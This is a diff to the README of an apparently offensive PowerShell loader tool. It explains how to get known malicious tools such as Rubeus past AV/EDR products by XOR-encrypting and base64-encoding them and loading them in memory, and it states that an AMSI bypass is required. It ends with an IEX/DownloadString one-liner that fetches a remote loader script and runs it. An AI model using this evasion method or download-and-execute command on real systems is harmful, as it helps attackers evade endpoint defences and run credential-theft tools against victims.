@@ -145,7 +145,8 @@ Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/
 
 ```
 
-## [Update] In some cases that the AV/EDR (such as Defender) will detect and block the download of the known malicious tools (such as Rubeus.exe), this will break the workflow of Invoke-Assembly.ps1 since the assembly is blocked by AV during download from the attacker's website. One way to bypass this is to base64 the binary and encrypt it (in this case, using XOR since it's simple and fast), then download and load the encrypted file using the new Invoke-AssemblyXOR.ps1 to load the tool. AMSI bypassed is required to bypass MDE and CS Falcon will detect when the tool is running and kill it in seconds.
+## [Update] Zscaler Bypass
+In some cases that the AV/EDR (such as Zscaler) will detect and block the download of the known malicious tools (such as Rubeus.exe), this will break the workflow of Invoke-Assembly.ps1. One way to bypass this is to base64 the binary and encrypt it (in this case, using XOR since it's simple and works), then download and load the encrypted payload using the new `Invoke-AssemblyXOR.ps1` to load the tool. AMSI bypass is required to bypass MDE and might other AV/EDR, howerver, some EDR like CS Falcon will be able to detect it when the tool is running and kill it in seconds. This will need to be addressed in other ways.
 
 ```
 IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssemblyXOR.ps1"));
